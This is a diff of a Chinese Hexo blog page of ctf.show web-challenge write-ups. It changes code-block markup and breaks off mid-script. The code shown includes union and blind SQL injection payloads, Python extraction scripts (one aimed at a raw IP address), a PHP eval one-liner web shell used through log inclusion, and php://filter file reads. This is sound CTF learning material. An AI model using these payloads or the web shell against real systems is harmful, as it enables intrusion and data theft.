@@ -43,7 +43,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jf71o0x1o1l" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
     
@@ -488,7 +488,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    8.1k
+                    7.7k
                 </div>
                 
 
@@ -645,9 +645,7 @@ alt="image-20230213080908941" /></h4>
 <li><p>地址栏是<code>get</code>传参</p></li>
 <li><p>sql注入post传参</p></li>
 <li><p>成功sql注入，可以回显</p>
-<pre class="language-markup" data-language="markup"><code class="language-markup">username=admin' or 1=1 order by 4# &amp;password=123456
-
-username=admin' or 1=1 order by 3# &amp;password=123456</code></pre></li>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; or 1=1 order by 4# &amp;password=123456</span><br><span class="line"></span><br><span class="line">username=admin&#x27; or 1=1 order by 3# &amp;password=123456</span><br></pre></td></tr></table></figure></li>
 <li><p>select 个数<img
 src="https://s2.loli.net/2023/02/13/ZyDW28pbmilUJIS.png"
 alt="image-20230213161043948" /><img
@@ -657,49 +655,35 @@ alt="image-20230213161014100" /></p></li>
 src="https://s2.loli.net/2023/02/13/9ju4Mf7DtA3Tqk8.png"
 alt="image-20230213160026269" /></p></li>
 <li><p>爆数据库</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">username&#x3D;admin&#39; or 1&#x3D;1 union select 1,group_concat(schema_name),3 from information_schema.schemata # &amp;password&#x3D;123456
-
- &quot;union&quot;: 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。
-
-&quot;select&quot;: 这是SQL语言中的一个关键字，表示从数据库中选择数据。
-
-&quot;1&quot;: 这是一个常量值，代表一个整数。
-
-&quot;group_concat&quot;: 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。
-
-&quot;schema_name&quot;: 这是&quot;information_schema.schemata&quot;表中的一列，代表数据库名称。
-
-&quot;information_schema.schemata&quot;: 这是MySQL数据库中的一个系统数据库表，包含数据库信息。
-
-&quot;3&quot;: 这是一个常量值，代表一个整数</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27; or 1=1 union select 1,group_concat(schema_name),3 from information_schema.schemata # &amp;password=123456</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &quot;union&quot;: 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;select&quot;: 这是SQL语言中的一个关键字，表示从数据库中选择数据。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;1&quot;: 这是一个常量值，代表一个整数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;group_concat&quot;: 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;schema_name&quot;: 这是&quot;information_schema.schemata&quot;表中的一列，代表数据库名称。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;information_schema.schemata&quot;: 这是MySQL数据库中的一个系统数据库表，包含数据库信息。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;3&quot;: 这是一个常量值，代表一个整数</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/b65mzrB2wUW9MHc.png"
 alt="image-20230213181032739" />
 <figcaption aria-hidden="true">image-20230213181032739</figcaption>
 </figure></li>
 <li><p>爆表</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">username&#x3D;admin&#39; or 1&#x3D;1 union select 1,group_concat(table_name),3 from information_schema.tables # &amp;password&#x3D;123456</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27; or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables # &amp;password=123456</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/RvZwiqalHCVrX3D.png"
 alt="image-20230213181732271" />
 <figcaption aria-hidden="true">image-20230213181732271</figcaption>
 </figure></li>
 <li><p>指定数据库的爆表</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">username&#x3D;admin&#39; or 1&#x3D;1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&quot;web2&quot; # &amp;password&#x3D;123456</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27; or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;web2&quot; # &amp;password=123456</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/nFGV8KBTd71gPx5.png"
 alt="image-20230213182835819" />
 <figcaption aria-hidden="true">image-20230213182835819</figcaption>
 </figure></li>
 <li><p>爆列</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">username&#x3D;admin&#39; or 1&#x3D;1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name &#x3D;&#39;flag&#39; and table_schema&#x3D;&#39;web2&#39;  # &amp;password&#x3D;123456</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27; or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&#x27;</span>flag<span class="string">&#x27; and table_schema=&#x27;</span>web2<span class="string">&#x27;  # &amp;password=123456</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/FpKWRagnsd3wZtQ.png"
 alt="image-20230213184817127" />
 <figcaption aria-hidden="true">image-20230213184817127</figcaption>
 </figure></li>
 <li><p>flag</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">username&#x3D;admin&#39; or 1&#x3D;1 union select 1,flag,3 from flag # &amp;password&#x3D;123456</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">&#x27; or 1=1 union select 1,flag,3 from flag # &amp;password=123456</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/xk7rV4TYGHUoNLf.png"
 alt="image-20230213185026341" />
@@ -735,7 +719,7 @@ alt="image-20230213221624031" /></p></li>
 <ul>
 <li>编码后的文件内容不会被执行,而是展示在页面中</li>
 </ul>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">http:&#x2F;&#x2F;19fd689a-f81b-4418-8ea2-ddc142465b1c.challenge.ctf.show&#x2F;?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">19</span>fd689a<span class="literal">-f81b-4418-8ea2-ddc142465b1c</span>.challenge.ctf.show/?url=php://<span class="keyword">filter</span>/read=convert.base64<span class="literal">-encode</span>/resource=index.php</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/13/WbtGQMyipwcDfqs.png"
 alt="image-20230213223316936" />
@@ -768,7 +752,7 @@ src="https://s2.loli.net/2023/02/13/e2sUuNjaX6FyMtq.png"
 alt="image-20230213232507475" /></p></li>
 <li><p>一句话木马</p></li>
 </ul>
-<p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code></pre></p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <ul>
 <li><p>antSword安装<img
 src="https://s2.loli.net/2023/02/13/VdpsDgC98tbNi5F.png"
@@ -780,8 +764,7 @@ alt="image-20230214002045185" />
 <figcaption aria-hidden="true">image-20230214002045185</figcaption>
 </figure></li>
 <li><p>蚁剑连接</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">URL地址：
-http:&#x2F;&#x2F;c3520b57-6be4-4a9d-87c9-b97780c4dc9f.challenge.ctf.show&#x2F;?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL地址：</span><br><span class="line">http://c3520b57<span class="literal">-6be4-4a9d-87c9-b97780c4dc9f</span>.challenge.ctf.show/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/14/OvR4Pu3infYBFMG.png"
 alt="image-20230214002211635" />
@@ -799,22 +782,10 @@ src="https://s2.loli.net/2023/02/24/D4cHsIlnwoBGeSr.png"
 alt="image-20230224013307979" /></h4>
 <ul>
 <li><p>代码解释</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php：这是 PHP 代码的起始标记，它告诉 PHP 解释器该文件包含 PHP 代码。
- $flag&#x3D;&quot;&quot;：这创建了一个名为 $flag 的变量，并将其初始值设置为空字符串。
- $v1&#x3D;$_GET[&#39;v1&#39;]：这将 GET 请求中的 v1 参数的值赋给变量 $v1。
- $v2&#x3D;$_GET[&#39;v2&#39;]：这将 GET 请求中的 v2 参数的值赋给变量 $v2。
- if(isset($v1) &amp;&amp; isset($v2))&#123;&#125;：这个条件语句检查变量 $v1 和 $v2 是否都已经设置，如果是则执行条件语句块中的代码。
- if(!ctype_alpha($v1))：这个条件语句检查 $v1 变量中是否只包含字母，如果不是，执行条件语句块中的代码，输出 &quot;v1 error&quot; 并终止脚本的执行。
- if(!is_numeric($v2))：这个条件语句检查 $v2 变量是否是一个数字，如果不是，执行条件语句块中的代码，输出 &quot;v2 error&quot; 并终止脚本的执行。
- if(md5($v1)&#x3D;&#x3D;md5($v2))：这个条件语句检查 $v1 和 $v2 的 md5 哈希值是否相同，如果是，执行条件语句块中的代码，输出 $flag 变量的值。
- echo $flag;：这个语句将 $flag 变量的值输出到客户端。
- &#125;else&#123;&#125;：如果 if 语句中的条件没有被满足，执行这个 else 语句块中的代码。
- echo &quot;where is flag?&quot;;：这个语句输出 &quot;where is flag?&quot;，表示在缺少 GET 请求参数的情况下无法找到 flag 值。
- ?&gt;：这是 PHP 代码的结束标记，告诉 PHP 解释器该文件的 PHP 代码部分已经结束。</code></pre></li>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>：这是 PHP 代码的起始标记，它告诉 PHP 解释器该文件包含 PHP 代码。</span><br><span class="line"> <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>：这创建了一个名为 <span class="variable">$flag</span> 的变量，并将其初始值设置为空字符串。</span><br><span class="line"> <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]：这将 GET 请求中的 v1 参数的值赋给变量 <span class="variable">$v1</span>。</span><br><span class="line"> <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]：这将 GET 请求中的 v2 参数的值赋给变量 <span class="variable">$v2</span>。</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;&#125;：这个条件语句检查变量 <span class="variable">$v1</span> 和 <span class="variable">$v2</span> 是否都已经设置，如果是则执行条件语句块中的代码。</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))：这个条件语句检查 <span class="variable">$v1</span> 变量中是否只包含字母，如果不是，执行条件语句块中的代码，输出 <span class="string">&quot;v1 error&quot;</span> 并终止脚本的执行。</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))：这个条件语句检查 <span class="variable">$v2</span> 变量是否是一个数字，如果不是，执行条件语句块中的代码，输出 <span class="string">&quot;v2 error&quot;</span> 并终止脚本的执行。</span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))：这个条件语句检查 <span class="variable">$v1</span> 和 <span class="variable">$v2</span> 的 md5 哈希值是否相同，如果是，执行条件语句块中的代码，输出 <span class="variable">$flag</span> 变量的值。</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag</span>;：这个语句将 <span class="variable">$flag</span> 变量的值输出到客户端。</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;&#125;：如果 <span class="keyword">if</span> 语句中的条件没有被满足，执行这个 <span class="keyword">else</span> 语句块中的代码。</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;：这个语句输出 <span class="string">&quot;where is flag?&quot;</span>，表示在缺少 GET 请求参数的情况下无法找到 flag 值。</span><br><span class="line"> <span class="meta">?&gt;</span>：这是 PHP 代码的结束标记，告诉 PHP 解释器该文件的 PHP 代码部分已经结束。</span><br></pre></td></tr></table></figure></li>
 <li><p>answer</p></li>
 </ul>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">http:&#x2F;&#x2F;e0e32665-ecd3-4333-b7b4-0d6c57e14d57.challenge.ctf.show&#x2F;?
-v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</code></pre>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://e0e32665<span class="literal">-ecd3-4333-b7b4-0d6c57e14d57</span>.challenge.ctf.show/?</span><br><span class="line">v1=QNKCDZO&amp;v2=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img src="https://s2.loli.net/2023/02/24/45hF9dq87cpfzDV.png"
 alt="image-20230224021331961" />
@@ -878,76 +849,20 @@ alt="image-20230225111446970" /></p></li>
 <li><p>点开一篇文章 观察地址栏 有参数id</p>
 <ul>
 <li><p>payload</p>
-<pre class="language-powershell" data-language="powershell"><code class="language-powershell">id&#x3D;1||1</code></pre></li>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>||<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
 <li><p>会显示所有文章：可sql注入</p></li>
 </ul></li>
 <li><p>接下来就是常规操作</p>
 <ul>
 <li><p>爆库，爆表，爆裂</p></li>
 <li><p>脚本</p>
-<pre class="language-python" data-language="python"><code class="language-python">import requests
-s&#x3D;requests.session()
-url&#x3D;&#39;http:&#x2F;&#x2F;376f6454-37f5-47df-aa98-bfd375f0f8d9.challenge.ctf.show&#x2F;index.php&#39;
-table&#x3D;&quot;&quot;
-for i in range(1,45):
-    print(i)
-    for j in range(31,128):
-        #爆表名  flag
-        payload &#x3D; &quot;ascii(substr((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database())from&#x2F;**&#x2F;%s&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%s#&quot;%(str(i),str(j))
-        #爆字段名 flag
-        #payload &#x3D; &quot;ascii(substr((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;0x666C6167)from&#x2F;**&#x2F;%s&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%s#&quot;%(str(i),str(j))
-        #读取flag
-        #payload &#x3D; &quot;ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)from&#x2F;**&#x2F;%s&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%s#&quot;%(str(i), str(j))
-        ra &#x3D; s.get(url&#x3D;url + &#39;?id&#x3D;0&#x2F;**&#x2F;or&#x2F;**&#x2F;&#39; + payload).text
-        if &#39;I asked nothing&#39; in ra:
-            table +&#x3D; chr(j)
-            print(table)
-            break</code></pre></li>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://376f6454-37f5-47df-aa98-bfd375f0f8d9.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(j))</span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
 <li><p>运行情况<img
 src="https://s2.loli.net/2023/02/26/5aFurQvdiW6fpO3.png"
 alt="image-20230226235929980" /></p></li>
 </ul></li>
 <li><p>换个脚本</p>
-<pre class="language-python" data-language="python"><code class="language-python">
-import requests
-url &#x3D; &quot;http:&#x2F;&#x2F;124.156.121.112:28069&#x2F;?id&#x3D;-1&#39;&#x2F;**&#x2F;&quot;
-
-
-def db(url):  # 爆库名
-    for i in range(1, 5):
-        for j in range(32, 128):
-            u &#x3D; &quot;or&#x2F;**&#x2F;ascii(substr(database()&#x2F;**&#x2F;from&#x2F;**&#x2F;&quot; + \
-                str(i)+&quot;&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;&quot;+str(j)+&quot;#&quot;
-            s &#x3D; url+u
-            print(s)
-            r &#x3D; requests.get(s)
-            if &#39;By Rudyard Kipling&#39; in r.text:
-                print(chr(j))
-
-
-def table(url):  # 爆表名
-    for i in range(4):
-        table_name &#x3D; &#39;&#39;
-        for j in range(1, 6):
-            for k in range(48, 128):
-                u &#x3D; id &#x3D; &quot;||&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;table_name&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()&#x2F;**&#x2F;limit&#x2F;**&#x2F;1&#x2F;**&#x2F;offset&#x2F;**&#x2F;&quot;+str(
-                    i)+&quot;)&#x2F;**&#x2F;from&#x2F;**&#x2F;&quot;+str(j)+&quot;&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;&quot;+str(k)+&quot;#&quot;
-                s &#x3D; url+u
-                print(s)
-                r &#x3D; requests.get(s)
-                if &#39;By Rudyard Kipling&#39; in r.text:
-                    table_name +&#x3D; chr(k)
-            print(table_name)
-
-
-def main():
-    db(url)
-    table(url)
-
-
-if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
-    main()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://124.156.121.112:28069/?id=-1&#x27;/**/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">url</span>):  <span class="comment"># 爆库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            u = <span class="string">&quot;or/**/ascii(substr(database()/**/from/**/&quot;</span> + \</span><br><span class="line">                <span class="built_in">str</span>(i)+<span class="string">&quot;/**/for/**/1))=&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;#&quot;</span></span><br><span class="line">            s = url+u</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            r = requests.get(s)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>(<span class="params">url</span>):  <span class="comment"># 爆表名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">128</span>):</span><br><span class="line">                u = <span class="built_in">id</span> = <span class="string">&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;</span>+<span class="built_in">str</span>(</span><br><span class="line">                    i)+<span class="string">&quot;)/**/from/**/&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;/**/for/**/1))=&quot;</span>+<span class="built_in">str</span>(k)+<span class="string">&quot;#&quot;</span></span><br><span class="line">                s = url+u</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                r = requests.get(s)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;By Rudyard Kipling&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="built_in">print</span>(table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    db(url)</span><br><span class="line">    table(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <ul>
 <li>没成功，这个响应报文的字符串为什么是用程序中那个，我的运行，没有打印出数据库名的任何一个字符。</li>
 </ul></li>
@@ -961,36 +876,7 @@ error</strong>；逗号（在函数中间隔参数）也被过滤：可以使用
 <li><p>有回显：爆出全部文章<img
 src="https://s2.loli.net/2023/02/28/I68TAYmO7pvVHyW.png"
 alt="image-20230228113555016" /></p>
-<pre class="language-python" data-language="python"><code class="language-python">import requests
- 
-url &#x3D; &#39;http:&#x2F;&#x2F;d664d69e-0da3-45b0-9170-12b4af6cfca9.challenge.ctf.show&#x2F;index.php?id&#x3D;-1&#x2F;**&#x2F;or&#x2F;**&#x2F;&#39;
-name &#x3D; &#39;&#39;
- 
-# 循环45次( 循环次数按照返回的字符串长度自定义)
-for i in range(1, 45):
-    # 获取当前使用的数据库
-    # payload &#x3D; &#39;ascii(substr(database()from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%d&#39;
-    # 获取当前数据库的所有表
-    # payload &#x3D; &#39;ascii(substr((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database())from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%d&#39;
-    # 获取flag表的字段
-    # payload &#x3D; &#39;ascii(substr((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;0x666C6167)from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%d&#39;
-    # 获取flag表的数据
-    payload &#x3D; &#39;ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&#x3D;%d&#39;
-    count &#x3D; 0
-    print(&#39;正在获取第 %d 个字符&#39; % i)
-    # 截取SQL查询结果的每个字符, 并判断字符内容
-    for j in range(31, 128):
-        result &#x3D; requests.get(url + payload % (i, j))
- 
-        if &#39;If&#39; in result.text:
-            name +&#x3D; chr(j)
-            print(&#39;数据库名&#x2F;表名&#x2F;字段名&#x2F;数据: %s&#39; % name)
-            break
- 
-        # 如果某个字符不存在,则停止程序
-        count +&#x3D; 1
-        if count &gt;&#x3D; (128 - 31):
-            exit()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://d664d69e-0da3-45b0-9170-12b4af6cfca9.challenge.ctf.show/index.php?id=-1/**/or/**/&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="comment"># 